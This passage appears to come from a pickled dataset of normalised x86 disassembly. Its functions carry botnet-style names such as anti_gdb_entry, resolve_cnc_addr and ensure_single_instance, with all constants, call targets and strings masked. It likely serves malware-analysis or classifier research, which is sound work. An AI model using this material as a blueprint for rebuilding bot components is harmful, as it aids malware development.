P~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~<STR>\nPUSH~ESI\nCALL~FOO\nMOV~EDX,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~EAX,<STR>\nMOV~BYTEPTR[EAX+EDX],0\nLEA~EDX,[ESP+0]\nSUB~ESP,0\nLEA~EAX,[EBX+EDI]\nSUB~EAX,EDX\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nMOV~EBX,EBP\nMOV~[ESP+0],0\nMOV~ESI,0\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~AL,[EDX+0]\nSUB~EAX,0\nCMP~AL,0\nJA~FOO\nLEA~EDI,[EDX+0]\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nINC~[ESP+0]\nCMP~ESI,EAX\nJL~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nSUB~EAX,EBX\nADD~ESP,0\nCMP~EAX,0\nJLE~FOO\nMOV~ESI,0\nJMP~FOO\nCMP~EBP,0\nJLE~FOO\nMOV~EAX,0\nMUL~,[ESP+0]\nMOV~EAX,EDX\nSHR~EAX,0\nLEA~EAX,[EAX+EAX*4]\nADD~EAX,EAX\nCMP~[ESP+0],EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nMOV~ESI,[ESP+0]\nADD~ESI,EAX\nADD~ESP,0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EAX,[ESI+EBX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~EBX,EAX\nADD~ESP,0\nPUSH~EDI\nPUSH~EBX\nCALL~FOO\nMOV~ESI,EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nADD~EBX,ESI\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+EAX+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EAX,[EBX-0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nCALL~FOO\nADD~ESP,0\nCMP~EBP,EAX\nJZ~FOO\nCALL~FOO\nCMP~EBP,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~<STR>\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EDI,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nJMP~FOO\nLEA~ESI,[ESP+0]\nPUSH~[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,EBX\nMOV~EAX,ESI\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nPUSH~[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,EBX\nMOV~EAX,ESI\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nPUSH~[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,EBX\nMOV~EAX,ESI\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nPUSH~[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,EBX\nMOV~EAX,ESI\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nPUSH~[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,EBX\nMOV~EAX,ESI\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nTEST~EAX,EAX\nJG~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~ESI,EBP\nMOV~EBX,[ESP+0]\nADD~ESP,0\nJMP~FOO\nMOV~ESI,EBP\nMOV~EBX,[ESP+0]\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EDX,EAX\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p83
L1804L
tp84
a(S'anti_gdb_entry'
p85
S'"MOV~<STR>,0\nRETN"'
p86
L11L
tp87
a(S'teardown_connection'
p88
S'"SUB~ESP,0\nMOV~EAX,<STR>\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p89
L49L
tp90
a(S'ensure_single_instance'
p91
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~[ESP+0],0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,EAX\nMOV~<STR>,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nMOV~EAX,0\nCMP~<STR>,0\nJNZ~FOO\nMOV~EAX,<STR>\nMOV~[ESP+0],0\nMOV~[ESP+0],EAX\nMOV~[ESP+0],0\nCALL~FOO\nMOV~EBX,EAX\nMOV~DWORDPTR[EAX],0\nLEA~ESI,[ESP+0]\nSUB~ESP,0\nPUSH~0\nPUSH~ESI\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nCMP~DWORDPTR[EBX],0\nJNZ~FOO\nMOV~<STR>,0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~ESI\nPUSH~<STR>\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~<STR>\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p92
L307L
tp93
a(S'main'
p94
S'"LEA~ECX,[ESP+0]\nAND~ESP,0\nPUSH~[ECX-0]\nPUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nPUSH~ECX\nSUB~ESP,0\nMOV~EAX,[ECX]\nMOV~[ESP+0],EAX\nMOV~ECX,[ECX+0]\nMOV~[ESP+0],ECX\nPUSH~DWORDPTR[ECX]\nCALL~FOO\nADD~ESP,0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nCALL~FOO\nMOV~<STR>,EAX\nMOV~<STR>,0\nMOV~<STR>,0\nMOV~<STR>,0\nMOV~EDX,[ESP+0]\nMOV~EBP,[EDX]\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nLEA~EDI,[ESP+0]\nMOV~ESI,0\nCLD\nMOV~ECX,0\nMOVSD~,\nMOV~EDX,0\nMOV~EAX,0\nADD~ESP,0\nLEA~ECX,[ESP+0]\nADD~EDX,[ECX+EAX*4-0]\nINC~EAX\nCMP~EAX,0\nJNZ~FOO\nTEST~EDX,EDX\nJZ~FOO\nMOV~EDI,0\nMOV~ECX,0\nMOV~ESI,0\nMOV~DL,[ESP+ECX+0]\nMOV~AL,[ESP+ECX+0]\nMOV~[ESP+ESI+0],AL\nMOV~[ESP+ESI+0],DL\nLEA~EBX,[ECX+ECX+0]\nSAR~EBX,0\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nMOV~EDX,ESI\nMOV~ECX,EAX\nMOV~EAX,ESI\nSAR~EDX,0\nIDIV~,ECX\nMOV~AL,[EBP+EDX+0]\nNOT~EAX\nADD~EDI,EAX\nLEA~ECX,[EBX-0]\nADD~ESI,0\nADD~ESP,0\nCMP~ESI,0\nJNZ~FOO\nMOV~EDX,EDI\nAND~EDX,0\nLEA~EAX,<STR>\nSUB~AX,DX\nLEA~EAX,[EDX+EAX*8]\nSHR~AX,0\nSHR~AL,0\nLEA~EAX,[EAX+EAX*8]\nMOV~EDX,EDI\nSUB~DL,AL\nMOV~AL,DL\nAND~EAX,0\nCALL~[ESP+EAX*4+0]\nSUB~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nPUSH~EBP\nCALL~FOO\nMOV~BL,AL\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~BL,BL\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCALL~FOO\nCALL~FOO\nSUB~ESP,0\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJNZ~FOO\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nPUSH~[EDX+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nPUSH~[ECX+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~[EAX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~EDX,[ESP+0]\nPUSH~[EDX+0]\nCALL~FOO\nADD~ESP,0\nCALL~FOO\nAND~EAX,0\nLEA~ESI,<STR>\nLEA~EBX,[ESP+0]\nSUB~ESP,0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+ESI+0],0\nADD~ESP,0\nPUSH~EBX\nMOV~ECX,[ESP+0]\nPUSH~DWORDPTR[ECX]\nCALL~FOO\nCALL~FOO\nMOV~ECX,EAX\nMOV~EAX,0\nMUL~,ECX\nMOV~EAX,EDX\nSHR~EAX,0\nLEA~EAX,[EAX+EAX*2]\nADD~EAX,EAX\nSUB~ECX,EAX\nLEA~ESI,<STR>\nADD~ESP,0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+ESI+0],0\nADD~ESP,0\nPUSH~EBX\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJG~FOO\nCALL~FOO\nMOV~EBP,EAX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCALL~FOO\nCALL~FOO\nCALL~FOO\nMOV~ESI,0\nADD~ESP,0\nMOV~EAX,0\nMOV~EDX,0\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nMOV~EAX,<STR>\nCMP~EAX,0\nJZ~FOO\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nCMP~<STR>,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~<STR>,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nMOV~EAX,<STR>\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~EAX\nMOV~<STR>,0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nCMP~<STR>,0\nJZ~FOO\nMOV~EAX,<STR>\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nJMP~FOO\nMOV~EAX,<STR>\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,<STR>\nMOV~EDX,<STR>\nCMP~EDX,EAX\nJGE~FOO\nMOV~EDX,EAX\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EDX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJNZ~FOO\nMOV~[ESP+0],0\nMOV~AL,0\nMOV~EDX,ESI\nMOV~ECX,EAX\nMOV~EAX,ESI\nSAR~EDX,0\nIDIV~,ECX\nINC~ESI\nTEST~EDX,EDX\nJNZ~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nMOV~ECX,<STR>\nCMP~ECX,0\nJZ~FOO\nMOV~EAX,ECX\nAND~EAX,0\nMOV~EDX,ECX\nSHR~EDX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nMOV~[ESP+0],0\nLEA~EAX,[ESP+0]\nSUB~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nPUSH~ECX\nCALL~FOO\nCALL~FOO\nCALL~FOO\nCALL~FOO\nADD~ESP,0\nPUSH~0\nMOV~EAX,EBP\nNEG~EAX\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCMP~<STR>,0\nJZ~FOO\nMOV~<STR>,0\nMOV~ECX,<STR>\nMOV~EAX,ECX\nAND~EAX,0\nMOV~EDX,ECX\nSHR~EDX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJNZ~FOO\nCALL~FOO\nJMP~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~<STR>\nCALL~FOO\nMOV~<STR>,0\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nMOV~ECX,0\nMUL~,ECX\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EDX\nMOV~EDX,[ESP+0]\nSHR~EDX,0\nLEA~EDX,[EDX+EDX*4]\nADD~EDX,EDX\nMOV~EAX,EBX\nSUB~EAX,EDX\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nCALL~FOO\nMOV~<STR>,EAX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~<STR>\nCALL~FOO\nMOV~AL,[ESP+0]\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nPUSH~0\nAND~EAX,0\nPUSH~EAX\nPUSH~EBX\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EDX,<STR>\nCMP~EDX,0\nJZ~FOO\nMOV~EAX,EDX\nAND~EAX,0\nSHR~EDX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nMOV~DWORDPTR[EAX],0\nPUSH~0\nPUSH~0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nMOV~EAX,[EBX]\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJNZ~FOO\nJMP~FOO\nTEST~EAX,EAX\nJNZ~FOO\nCALL~FOO\nJMP~FOO\nMOV~AX,[ESP+0]\nTEST~AX,AX\nJNZ~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nROR~AX,0\nMOV~[ESP+0],AX\nCMP~AX,0\nJBE~FOO\nSUB~ESP,0\nPUSH~<STR>\nCALL~FOO\nMOV~<STR>,0\nADD~ESP,0\nMOV~DWORDPTR[EBX],0\nPUSH~0\nMOV~AX,[ESP+0]\nAND~EAX,0\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nMOV~EAX,[EBX]\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJNZ~FOO\nJMP~FOO\nTEST~EAX,EAX\nJNZ~FOO\nCALL~FOO\nJMP~FOO\nPUSH~0\nPUSH~0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~<STR>\nCALL~FOO\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ESP+0],AX\nPUSH~0\nAND~EAX,0\nPUSH~EAX\nLEA~EBX,[ESP+0]\nPUSH~EBX\nPUSH~<STR>\nCALL~FOO\nMOV~AX,[ESP+0]\nADD~ESP,0\nTEST~AX,AX\nJZ~FOO\nSUB~ESP,0\nAND~EAX,0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,0\nADD~ESP,0\nPOP~ECX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nLEA~ESP,[ECX-0]\nRETN"'
p95
L2260L
tp96
a(S'resolve_cnc_addr'
p97
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nMOV~ESI,EAX\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nTEST~ESI,ESI\nJZ~FOO\nMOV~EBX,[ESI+0]\nCALL~FOO\nMOV~EDX,0\nMOV~DL,[ESI]\nMOV~ECX,EDX\nMOV~EDX,0\nDIV~,ECX\nMOV~EAX,[EBX+EDX*4]\nMOV~<STR>,EAX\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~AX,[EAX]\nMOV~<STR>,AX\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p98
L148L
tp99
a(S'rand_next'
p100
S'"PUSH~EBX\nMOV~EBX,<STR>\nMOV~EAX,EBX\nSHL~EAX,0\nXOR~EBX,EAX\nMOV~EAX,<STR>\nMOV~<STR>,EAX\nMOV~EAX,<STR>\nMOV~<STR>,EAX\nMOV~EDX,<STR>\nMOV~<STR>,EDX\nMOV~EAX,EBX\nSHR~EAX,0\nMOV~ECX,EDX\nSHR~ECX,0\nXOR~EDX,ECX\nXOR~EBX,EDX\nXOR~EAX,EBX\nMOV~<STR>,EAX\nPOP~EBX\nRETN"'
p101
L69L
tp102
a(S'rand_str'
p103
S'"PUSH~ESI\nPUSH~EBX\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nTEST~EBX,EBX\nJLE~FOO\nCMP~EBX,0\nJLE~FOO\nCALL~FOO\nMOV~[ESI],EAX\nADD~ESI,0\nSUB~EBX,0\nJMP~FOO\nCMP~EBX,0\nJLE~FOO\nCALL~FOO\nMOV~[ESI],AX\nADD~ESI,0\nSUB~EBX,0\nJMP~FOO\nCALL~FOO\nMOV~[ESI],AL\nINC~ESI\nDEC~EBX\nTEST~EBX,EBX\nJG~FOO\nPOP~EBX\nPOP~ESI\nRETN"'
p104
L71L
tp105
a(S'rand_alphastr'
p106
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBP,[ESP+0]\nMOV~EBX,[ESP+0]\nLEA~EDI,[ESP+0]\nMOV~ESI,0\nCLD\nMOV~ECX,0\nMOVSD~,\nMOV~AL,<STR>\nMOV~[EDI],AL\nTEST~EBX,EBX\nJLE~FOO\nMOV~EDI,EBX\nCMP~EBX,0\nJBE~FOO\nCALL~FOO\nMOV~ECX,EAX\nMOV~EDX,EBP\nMOV~ESI,0\nMOV~AL,CL\nSHR~ECX,0\nSHR~AL,0\nAND~EAX,0\nMOV~AL,[ESP+EAX+0]\nMOV~[EDX],AL\nINC~EDX\nINC~ESI\nCMP~ESI,0\nJNZ~FOO\nADD~EBP,0\nLEA~EBX,[EDI-0]\nJMP~FOO\nCALL~FOO\nMOV~ESI,EAX\nMOV~ECX,0\nMUL~,ECX\nMOV~[ESP],EAX\nMOV~[ESP+0],EDX\nMOV~ECX,[ESP+0]\nSHR~ECX,0\nMOV~EDX,ECX\nSHL~EDX,0\nADD~EDX,ECX\nMOV~EAX,ESI\nSUB~EAX,EDX\nMOV~[EBP+0],AL\nINC~EBP\nDEC~EBX\nTEST~EBX,EBX\nJG~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p107
L154L
tp108
a(S'rand_init'
p109
S'"PUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~<STR>,EAX\nCALL~FOO\nMOV~EBX,EAX\nCALL~FOO\nXOR~EAX,EBX\nMOV~<STR>,EAX\nCALL~FOO\nMOV~<STR>,EAX\nXOR~EAX,<STR>\nMOV~<STR>,EAX\nADD~ESP,0\nPOP~EBX\nRETN"'
p110
L61L
tp111
a(S'resolv_skip_name'
p112
S'"PUSH~ESI\nPUSH~EBX\nMOV~EBX,EAX\nMOV~ESI,EDX\nMOV~DWORDPTR[ECX],0\nMOV~EDX,0\nJMP~FOO\nCMP~AL,0\nJBE~FOO\nAND~EAX,0\nSHL~EAX,0\nMOV~EDX,0\nMOV~DL,[EBX+0]\nLEA~EAX,[EAX+EDX-0]\nLEA~EBX,[EAX+ESI]\nMOV~EDX,0\nJMP~FOO\nINC~EBX\nTEST~EDX,EDX\nJNZ~FOO\nINC~DWORDPTR[ECX]\nMOV~AL,[EBX]\nTEST~AL,AL\nJNZ~FOO\nCMP~EDX,0\nJNZ~FOO\nINC~DWORDPTR[ECX]\nPOP~EBX\nPOP~ESI\nRETN"'
p113
L79L
tp114
a(S'resolv_entries_free'
p115
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nTEST~EBX,EBX\nJZ~FOO\nMOV~EAX,[EBX+0]\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nRETN"'
p116
L48L
tp117
a(S'resolv_domain_to_hostname'
p118
